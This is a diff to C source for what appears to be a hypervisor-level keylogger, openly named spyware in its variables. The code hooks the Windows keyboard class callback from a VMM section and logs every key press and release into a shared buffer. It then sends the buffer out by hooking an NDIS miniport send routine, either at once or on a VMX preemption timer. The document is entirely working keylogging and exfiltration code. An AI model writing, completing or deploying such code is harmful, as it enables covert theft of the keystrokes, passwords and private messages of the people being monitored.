@@ -54,42 +54,61 @@ __attribute__((section(".vmm"))) void handle_KeyboardClassServiceCallback_hook(v
     KEYBOARD_INPUT_DATA *data_phys;
     for (; InputDataStart < InputDataEnd; InputDataStart++){
         data_phys = guest_virtual_to_physical(InputDataStart);
+
+        AcquireLock(&shared_cores_data.spyware_data_lock);
+
+        if (shared_cores_data.spyware_data_buffer.length >= MAX_BUFFER_LENGTH){
+            ReleaseLock(&shared_cores_data.spyware_data_lock);
+            return;
+        } 
+
+        if ((byte_t)data_phys->MakeCode & 0x80){
+            LOG_DEBUG("Non-relevant key: %x\n", (byte_t)data_phys->MakeCode);
+            ReleaseLock(&shared_cores_data.spyware_data_lock);
+            continue;
+        }
+
         if (data_phys->Flags == KEY_MAKE){
             LOG_INFO("Key pressed: %c\n", kbd_US[data_phys->MakeCode]);
-            AcquireLock(&shared_cores_data.spyware_data_lock);
             shared_cores_data.spyware_data_buffer.chars[shared_cores_data.spyware_data_buffer.length] = (byte_t)data_phys->MakeCode;
-            shared_cores_data.spyware_data_buffer.length++;
-            
-            #ifdef IMMEDIATE_SENDING
+        }
+        else if (data_phys->Flags == KEY_BREAK){
+            shared_cores_data.spyware_data_buffer.chars[shared_cores_data.spyware_data_buffer.length] = (byte_t)data_phys->MakeCode | 0x80;
+        }
+        else {
+            ReleaseLock(&shared_cores_data.spyware_data_lock);
+            continue;
+        }
+
+        shared_cores_data.spyware_data_buffer.length++;
+        
+        #ifdef IMMEDIATE_SENDING
+        shared_cores_data.send_pending = TRUE;
+        hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET));
+        #endif
+
+        #ifndef IMMEDIATE_SENDING
+        // Activate preemption timer
+        if (!shared_cores_data.send_pending){
+            pin_based_ctls_t pin_based_ctls = {0};
+            pin_based_ctls.value = __vmread(CONTROL_PIN_BASED_VM_EXECUTION_CONTROLS);
+
+            if (!pin_based_ctls.activate_vmx_preemption_timer){
+                pin_based_ctls.activate_vmx_preemption_timer = TRUE;
+                __vmwrite(CONTROL_PIN_BASED_VM_EXECUTION_CONTROLS, pin_based_ctls.value);
+                __vmwrite(GUEST_VMX_PREEMPTION_TIMER, SEND_TIMER_TIME);
+            }
+        }
+
+        // Send if buffer is almost full
+        if (shared_cores_data.spyware_data_buffer.length >= 150){
             shared_cores_data.send_pending = TRUE;
             hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET));
-            #endif
-
-            #ifndef IMMEDIATE_SENDING
-            // Activate preemption timer
-            if (!shared_cores_data.send_pending){
-                pin_based_ctls_t pin_based_ctls = {0};
-                pin_based_ctls.value = __vmread(CONTROL_PIN_BASED_VM_EXECUTION_CONTROLS);
-
-                if (!pin_based_ctls.activate_vmx_preemption_timer){
-                    pin_based_ctls.activate_vmx_preemption_timer = TRUE;
-                    __vmwrite(CONTROL_PIN_BASED_VM_EXECUTION_CONTROLS, pin_based_ctls.value);
-                    __vmwrite(GUEST_VMX_PREEMPTION_TIMER, SEND_TIMER_TIME);
-                }
-            }
-
-            // Send if buffer is almost full
-            if (shared_cores_data.spyware_data_buffer.length >= 150){
-                shared_cores_data.send_pending = TRUE;
-                hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET));
-            } 
-            #endif
-            
-            ReleaseLock(&shared_cores_data.spyware_data_lock);
-        }
-        else if (data_phys->Flags == KEY_BREAK)
-            continue;
-            // LOG_INFO("Key released: %c\n", kbd_US[data_phys->MakeCode]);
+        } 
+        #endif
+        
+        ReleaseLock(&shared_cores_data.spyware_data_lock);
+    
     }
 
 }
